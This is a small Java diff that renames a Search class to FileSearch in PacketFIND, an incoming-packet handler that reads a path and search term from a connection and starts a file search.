@@ -3,7 +3,7 @@ package com.redpois0n.packets.incoming;
 import java.io.File;
 
 import com.redpois0n.Connection;
-import com.redpois0n.Search;
+import com.redpois0n.FileSearch;
 
 
 public class PacketFIND extends AbstractIncomingPacket {
@@ -16,7 +16,7 @@ public class PacketFIND extends AbstractIncomingPacket {
 		}
 		String what = Connection.readLine();
 		boolean dir = Connection.readBoolean();
-		new Search(start, what, dir).start();
+		new FileSearch(start, what, dir).start();
 	}
 
 }
